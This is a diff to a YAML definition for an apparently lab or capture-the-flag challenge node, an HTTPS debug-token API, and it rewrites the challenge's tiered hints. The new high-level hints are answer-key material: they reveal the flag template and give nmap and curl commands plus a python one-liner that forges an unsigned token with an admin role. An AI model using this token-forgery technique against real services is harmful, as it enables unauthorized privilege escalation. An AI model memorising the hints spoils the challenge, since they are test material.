@@ -4,7 +4,7 @@ kind: flag-node-generator
 name: 'HTTPS: Token Debug API'
 description: TLS JSON API with editable debug token behavior, exposed API key metadata,
   and realistic telemetry output.
-hint_template: Inspect the debug token before moving to {{NEXT_NODE_NAME}}.
+hint_template: Explore the portal and the operational records it makes available.
 note_color: yellow
 note: >-
   Could not open a chain: with no low hint naming an artifact it produces,
@@ -77,17 +77,27 @@ access_instructions:
     instructions: Record the flag returned by the admin token response.
 hint_levels:
   low:
-  - Inspect the debug token before moving to {{NEXT_NODE_NAME}}.
-  # Required for this generator to be usable as the first step of a chain.
-  # Without a low hint naming an artifact it produces, flag-sequencing rejects
-  # the plan before any generator runs. This is the remedy the validator's own
-  # error recommends ("Promote the disclosing hint to 'low'"), written rather
-  # than moved because no such line existed. It makes the challenge marginally
-  # easier, which is the intended trade against one nobody can enter.
-  - 'Debug token: {{OUTPUT.Token(service)}}'
+  - Explore the portal and the operational records it makes available.
   medium:
-  - 'File/artifact: {{OUTPUT.File(path):basename}}'
+  - 'Service: HTTPS Debug Token API. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
+  - |-
+    Check the assigned port:
+    ```bash
+    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
+    ```
   high:
-  - Query the profile endpoint
-  - 'Inspect token behavior: The token payload is not signed.'
-  - 'Record the API result: Record the flag returned by the admin token response.'
+  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
+  - |-
+    Query the profile endpoint:
+    ```bash
+    curl -k 'https://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/api/profile?token={{OUTPUT.Token(service)}}'
+    ```
+  - |-
+    Inspect token behavior:
+    The token payload is not signed. Decode it, change the role to admin, base64-url encode it again, and retry the profile endpoint.
+  - |-
+    Request the admin profile with an unsigned role claim:
+    ```bash
+    token=$(python3 -c 'import base64; print(base64.urlsafe_b64encode(b"{\"role\":\"admin\"}").decode().rstrip("="))')
+    curl -k --get --data-urlencode "token=$token" "https://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/api/profile"
+    ```
